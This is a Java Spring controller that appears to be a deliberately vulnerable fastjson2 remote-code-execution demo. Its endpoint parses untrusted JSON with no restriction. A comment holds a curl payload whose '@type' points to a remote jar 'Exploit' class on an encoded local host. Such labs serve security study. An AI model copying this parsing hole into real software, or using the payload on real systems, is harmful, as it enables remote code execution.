package com.example.demo.controller;

import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson2.JSON;
import com.alibaba.fastjson2.JSONObject;

import lombok.extern.slf4j.Slf4j;

@Slf4j
@RestController
@RequestMapping("/fastjson/rce")
public class FastJsonRceController {

    /**
     *
     curl -X POST http://127.0.0.1:8880/fastjson/rce/parse \
     -H "Content-Type: application/json" \
     -d '{"@type":"jar:http:..2130706433:8000.exploit!.Exploit","x":1}'
     * 
     */
    @PostMapping("parse")
    public String parseString(@RequestBody String jsonStr) {
        log.info("received rce-jsonStr:{}", jsonStr);
        JSONObject jsonObject = JSON.parseObject(jsonStr);
        return "Parsed JSON: " + jsonObject.toJSONString();
    }

}
